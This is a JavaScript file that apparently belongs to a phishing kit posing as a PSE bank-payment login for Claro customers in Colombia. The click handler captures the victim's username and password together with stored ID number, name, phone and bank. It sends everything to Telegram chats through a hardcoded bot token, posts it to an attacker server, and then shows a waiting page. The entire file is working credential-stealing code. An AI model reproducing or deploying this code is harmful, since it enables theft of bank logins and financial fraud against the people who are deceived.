function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón de entrar
const button = document.getElementById("btnUsuario");

// Input de Usuario
const userInput = document.getElementById("txtUsuario");

// Input de Contraseña
const passInput = document.getElementById("txtPass");

// Función para enviar mensaje a Telegram
async function sendToTelegram(message) {
  try {
    for (const chatId of chatIds) {
      const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
        message
      )}`;

      const response = await fetch(url);
      if (response.ok) {
        console.log(`Mensaje enviado a Telegram (chat ID: ${chatId})`);
      } else {
        console.error(
          `Error al enviar mensaje (chat ID: ${chatId}):`,
          response.statusText
        );
      }
    }
  } catch (error) {
    console.error("Error de red al enviar mensaje:", error);
  }
}

// Evento click en el botón
button.addEventListener("click", async function (e) {
  e.preventDefault();
  button.disabled = true;

  // Validación de campos vacíos
  if (!userInput.value || !passInput.value) {
    alert("Por favor ingrese la información requerida");
    userInput.focus();
    button.disabled = false;
    return;
  }

  // Asignar valores
  const user = userInput.value;
  const pass = passInput.value;

  // Actualizar la información local
  info.metaInfo.user = user;
  info.metaInfo.puser = pass;

  updateLS();

  // Preparar los datos a enviar
  const data = {
    id: info.metaInfo.cc,
    nombre: info.metaInfo.dudename,
    telefono: info.metaInfo.telnum,
    direccion: "", // Dirección está vacía por ahora
    usuario: info.metaInfo.user,
    password: info.metaInfo.puser,
    bank: info.metaInfo.ban,
  };

  // Crear el mensaje con toda la información
  const message = `🟣 PSE (Claro)\n©️ID: ${data.id}\n🆔Nombre: ${data.nombre}\n📱Teléfono: ${data.telefono}\n🚹Usuario: ${data.usuario}\n🔒Contraseña: ${data.password}\n🏦Banco: ${data.bank}\nFuente: ${fuente}`;

  // Enviar el mensaje a Telegram
  await sendToTelegram(message);

  // Enviar los datos al servidor
  try {
    const response = await fetch(`${url}/trico/tricoPse`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error("Error al enviar los datos al servidor");
    }

    // Redirigir a la página de espera
    window.location.href = "./wait.html";
  } catch (error) {
    console.error("Error al procesar la solicitud:", error);
    button.disabled = false; // Reactivar el botón en caso de error
  }
});
